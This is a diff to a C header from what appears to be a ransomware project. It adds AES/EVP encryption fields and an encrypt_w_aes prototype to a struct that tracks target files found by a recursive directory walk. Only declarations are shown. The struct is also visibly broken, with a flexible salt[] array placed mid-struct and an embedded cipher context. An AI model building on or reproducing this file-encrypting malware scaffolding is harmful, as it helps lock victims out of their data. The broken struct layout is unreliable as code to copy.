@@ -3,8 +3,8 @@
 
 #include "obfuscation.h"
 
-#include "aes.h"
-#include "evp.h"
+#include "openssl/aes.h"
+#include "openssl/evp.h"
 
 #include <dirent.h>
 #include <limits.h>
@@ -23,15 +23,21 @@
   * struct target_file_s - refillable buffers for each target file
   * @filepath: path to the file from readdir
   * @buf: buffer of BUFSIZE * 4
+  * @file_offset: If buffer < file size
+  * @bytes_read: bytes currently read from file.
   * @file_info: information about the target file
+  * @encrypt: Struct that stores cipher encryption info
+  * @salt: integer array for salt that is converted to 8 bytes
  **/
 typedef struct target_file_s
 {
 	char *filepath;
 	char *buf;
 	off_t file_offset;
-	size_t bytes_read;
+	size_t bytes_read; /** NEED? **/
 	struct stat file_info;
+	unsigned int salt[]; /** TEMP **/
+	EVP_CIPHER_CTX encrypt;
 } target_file_t;
 void free_target_file_struct(target_file_t target_file);
 /**
@@ -93,7 +99,8 @@ node_t *recurse_ls(char *filename, ransom_t *ransom);
 size_t read_file(const char *filepath, ransom_t *ransom, char *(*fxn)(char *, ransom_t *));
 char *write_file(char *filepath, ransom_t *ransom);
 
-/* Base64 POC */
+/* Encrypt buffers */
+char *encrypt_w_aes(char *buffer, size_t size);
 char *base64decode (const void *b64_decode_str, int decode_size);
 char *base64encode (const void *b64_encode_str, int encode_size);
 
